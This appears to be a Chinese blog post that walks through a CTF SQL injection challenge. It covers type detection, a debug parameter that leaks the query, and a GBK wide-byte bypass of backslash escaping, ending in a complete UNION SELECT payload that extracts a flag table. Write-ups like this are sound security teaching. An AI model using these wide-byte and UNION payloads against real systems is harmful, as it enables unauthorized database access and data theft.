---
title: "一次宽字节注入的完整复盘：从字符串型判断到 UNION 绕过"
summary: "LitCTF 的一道 EasySql，把判断注入类型、识别转义防御、宽字节绕过和 UNION 取数四个环节完整走了一遍。"
category: tech
publishedAt: 2026-07-28
tags: ["SQL注入", "CTF", "Web安全"]
cover: "/images/post-ctf-sqli.webp"
coverAlt: "暗色终端里的一行 SQL 查询"
featured: false
kicker: "CTF 复盘"
---

一道名为 EasySql 的题目，看起来简单，却把 SQL 注入里最经典的一串判断路径完整走了一遍：先确认注入类型，再通过调试参数泄露完整语句，识别出反斜杠转义后，用宽字节绕过，最后以 UNION 取出目标数据。

## 第一步：判断注入类型

初始探测给出三条线索：

- `id=1` 正常返回 5 列：`id, name, col2, col3, col4`
- `id=2` 返回 bob，`id=3` 无结果，说明表里数据不多
- `id=1'` 没有报错，返回的仍是 `id=1` 的数据

接着用 `id=2-1` 试探：返回的是 `id=2` 而不是 `id=1`。如果是数字型注入，`2-1` 会被当整数计算得到 1。返回 2 说明这不是数字型。

这里其实是 MySQL 的隐式类型转换行为：`WHERE id = '2-1'` 中，MySQL 把字符串 `'2-1'` 转为整数时只取前缀数字 2。结论：**字符串型注入，输入被单引号包裹**。

## 第二步：借助 debug 参数拿到完整 SQL

尝试 `?id=1&debug=1`，页面额外输出了"执行 SQL"：

```sql
SELECT `id`,`name`,`col2`,`col3`,`col4` FROM `ezsql`.`users` WHERE id='1' LIMIT 50
```

这直接确认了四件事：字符串型、5 列、数据库名 `ezsql`、表名 `users`。调试接口泄露 SQL 在 CTF 里很常见，是白送的侦察信息。

## 第三步：识别防御机制

带 `debug` 测试 `id=1' union select 1,2,3,4,5-- `，看到实际执行的 SQL：

```sql
WHERE id='1\' union select 1,2,3,4,5-- '
```

单引号被加上了反斜杠转义（`addslashes` 或 `mysql_real_escape_string`）。但 `UNION`、`SELECT` 等关键字没有被过滤——问题只在引号逃不出来。这说明防御重心放在转义上，而转义本身存在历史漏洞。

## 第四步：宽字节注入绕过

服务端用反斜杠转义：`'` → `\'`（即 `%5c%27`）。如果数据库连接使用 **GBK 编码**，可以在引号前加一个字节（如 `%bf`），让 `%bf%5c` 被解析为一个合法的 GBK 双字节字符，从而"吃掉"反斜杠：

```
输入:   %bf'
转义后: %bf\'  即 %bf%5c%27
GBK解析: [%bf%5c] + [%27]  →  一个汉字 + 裸单引号
```

转义后变成 `%bf%5c%27`，GBK 认为 `%bf%5c` 是一个字符，`%27`（单引号）独立存在，成功闭合引号。

## 第五步：构造 payload 提取目标数据

```text
id=%bf' union select 1,flag,3,4,5 from flag_store--
```

实际执行的 SQL：

```sql
SELECT ... FROM users WHERE id='縗' union select 1,flag,3,4,5 from flag_store-- ' LIMIT 50
```

前半段查询 `id='縗'` 无结果，UNION 的第二个 SELECT 返回 `flag_store` 表的内容。

## 小结

整条链路的技术点可以浓缩成一张表：

| 步骤 | 技术点 |
|------|--------|
| 判断类型 | `2-1` 返回 id=2 → 字符串型 |
| 获取信息 | `debug=1` 泄露完整 SQL |
| 识别防御 | 反斜杠转义单引号，无关键字过滤 |
| 绕过方式 | GBK 宽字节注入（`%bf'` 吞掉 `\`） |
| 利用方式 | UNION SELECT 联合查询，从目标表读数据 |

宽字节注入是转义类防御的经典失效场景：它依赖于"转义在字节层、解析在字符集层"这一错位。现代防御通常直接用参数化查询或 `SET NAMES utf8` 规避，但理解这道题的链路，仍然是把注入判断思维练扎实的很好起点。
